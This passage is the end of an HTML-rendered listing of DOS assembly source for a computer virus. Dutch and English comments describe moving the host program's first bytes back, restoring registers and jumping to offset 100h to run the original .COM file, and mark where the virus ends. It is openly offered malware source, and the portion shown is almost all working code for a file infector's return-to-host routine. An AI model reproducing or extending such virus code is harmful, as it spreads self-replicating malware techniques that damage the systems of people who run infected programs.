        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">     </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">Source</span><span class="sc0">           </span><span class="sc1">; Verplaatsen van het 1e deel</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">         </span><span class="sc1">; van het programma, wat achter</span><span class="sc0">
        </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">Movsb</span><span class="sc0">               </span><span class="sc1">;------------------</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">                  </span><span class="sc1">; Opgeslagen registers weer</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">                  </span><span class="sc1">; terugzetten op originele</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc0">                  </span><span class="sc1">; waarde en springen naar</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                  </span><span class="sc1">; het begin van het programma</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">                  </span><span class="sc1">; (waar nu het virus niet meer</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; staat)</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Popf</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">;------------------</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">; Only the end of the virus is stored in here.</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">Einde</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Code</span><span class="sc0">            </span><span class="sc9">Ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0">             </span><span class="sc5">Begin</span><span class="sc0">

</span></div></body>
</html>
